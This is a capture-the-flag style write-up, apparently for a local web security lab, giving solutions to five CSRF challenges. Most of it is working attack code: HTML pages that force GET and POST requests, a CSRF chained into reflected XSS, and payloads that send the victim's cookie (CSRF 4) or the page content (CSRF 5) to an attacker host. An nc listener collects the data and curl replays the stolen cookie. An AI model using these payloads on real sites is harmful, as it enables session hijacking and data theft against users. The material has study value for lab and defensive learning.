# CSRF

## CSRF 1

Create a html page to serve, which makes the GET request via **top-level navigation**:

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/publish'"></body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

## CSRF 2

Create a html page to serve, which makes the POST request via **self-submitting form**:

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="document.forms[0].submit()">
    <form action="http://challenge.localhost/publish" method="POST"></form>
</body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

## CSRF 3

Triggering XSS through CSRF

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>alert(&quot;PWNED&quot;)</script'+'>'"></body>
</html>
```

Run in the directory of index.html:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

## CSRF 4

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>window.location.href=&quot;http://hacker.localhost:5050?cookie=&quot;%2bdocument.cookie</script'+'>'"></body>
</html>
```

Start the attacker server:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

Listen for cookie:

```shell
nc -l -v hacker.localhost 5050
```

Use the stolen cookie:

```shell
curl -v --cookie "<stolen cookie>" http://challenge.localhost
```

## CSRF 5

index.html:

```html
<!DOCTYPE html>
<html>
<body onload="window.location='http://challenge.localhost/ephemeral?msg='+'<'+'script>fetch(&quot;http://challenge.localhost/&quot;).then(res=>res.text()).then(data=>{window.location.href=&quot;http://hacker.localhost:5050?page=&quot;%2bencodeURIComponent(data);});</script'+'>'"></body>
</html>
```

Start the attacker server:

```shell
python3 -m http.server 1337 --bind hacker.localhost
```

Listen for the page content:

```shell
nc -l -v hacker.localhost 5050
```
